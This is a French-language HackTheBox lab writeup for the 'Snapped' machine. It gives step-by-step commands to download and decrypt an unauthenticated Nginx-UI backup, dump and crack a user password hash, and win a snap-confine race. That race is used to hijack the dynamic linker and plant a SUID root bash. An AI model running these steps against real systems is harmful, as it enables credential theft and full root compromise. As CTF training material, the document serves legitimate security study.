# Snapped - HackTheBox Writeup

**Machine:** Snapped  
**Difficulty:** Hard  
**OS:** Ubuntu 24.04  
**Authors:** TheCyberGeek & Pho3o  
**Date:** 20 Mars 2026

## Synopsis

Snapped est une machine Hard qui exploite deux CVEs récentes.

- **Foothold** : CVE-2026-27944 (Nginx-UI) → Accès non authentifié à l'endpoint `/api/backup` avec divulgation de la clé de chiffrement.
- **Privilege Escalation** : CVE-2026-3888 → TOCTOU race condition dans `snap-confine` + `systemd-tmpfiles`, gagnée grâce à la backpressure AF_UNIX et manipulation de namespace.

---

## Enumeration

```bash
nmap -sCV 10.129.242.192
Ports ouverts :

22/tcp → OpenSSH 9.6p1
80/tcp → nginx 1.24.0 (redirect vers http://snapped.htb)

Bashecho "10.129.242.192 snapped.htb" | sudo tee -a /etc/hosts
echo "10.129.242.192 admin.snapped.htb" | sudo tee -a /etc/hosts
Fuzzing des sous-domaines → découverte de admin.snapped.htb (Nginx-UI).

Foothold - CVE-2026-27944
Bashffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://admin.snapped.htb/api/FUZZ -ic
Endpoint intéressant : /api/backup
Bashcurl -OJ http://admin.snapped.htb/api/backup
Le header X-Backup-Security contient key:iv.
Décryptage du backup
Bash# Extraction key & iv
key=$(echo 'Uggi+bPybhVny2dV+MaAVAkjSrzQBCjWFhbsenNiVJA=' | base64 -d | xxd -p -c 256)
iv=$(echo 'Jky/YQ0ISOX3gcTE9lj7zQ==' | base64 -d | xxd -p)

unzip backup-*.zip
cd backup

openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
unzip nginxui_decrypted.zip
Extraction des credentials
Bashsqlite3 database.db "select * from users;"
Hash bcrypt cracked → jonathan:linkinpark
Bashssh jonathan@snapped.htb
User flag récupéré.

Privilege Escalation - CVE-2026-3888 (Snapd)
Reconnaissance
Bashsnap --version
# snapd 2.63.1+24.04 → vulnérable
Le système utilise un nettoyage agressif de /tmp via systemd-tmpfiles (4 minutes).
Exploitation
1. Entrer dans le sandbox Firefox (Terminal 1)
Bashenv -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
cd /tmp
echo $$
2. Exécuter le race helper (Terminal 2)
Compiler et lancer firefox_2404 (code fourni plus bas).
Bash~/firefox_2404 ~/payload.so
Le helper recrée .snap, utilise la backpressure sur socket AF_UNIX pour single-step snap-confine et swap atomiquement les dossiers via renameat2(RENAME_EXCHANGE).
3. Trigger Root (Terminal 3)
BashPID=$(cat /proc/*/cwd/race_pid.txt 2>/dev/null | head -n1)
cd /proc/$PID/root

cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2

env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
Dans le shell BusyBox :
Bashcp /bin/bash /var/snap/firefox/common/bash
chmod 04755 /var/snap/firefox/common/bash
exit
4. Root final
Bash/var/snap/firefox/common/bash -p
id
cat /root/root.txt
Root obtenu !

Exploit Components
firefox_2404.c (Race Helper)
librootshell.c (Shellcode ld-linux)
(Les sources complètes sont disponibles dans le dossier exploit/ de ce repo)

Résumé des Techniques

Exfiltration de backup non authentifiée (CVE-2026-27944)
TOCTOU Race Condition sur snap-confine
Contrôle fin d'exécution via backpressure AF_UNIX
Atomic directory swap avec renameat2(RENAME_EXCHANGE)
Dynamic Linker Hijacking sur binaire SUID-root
Évasion de sandbox via AppArmor
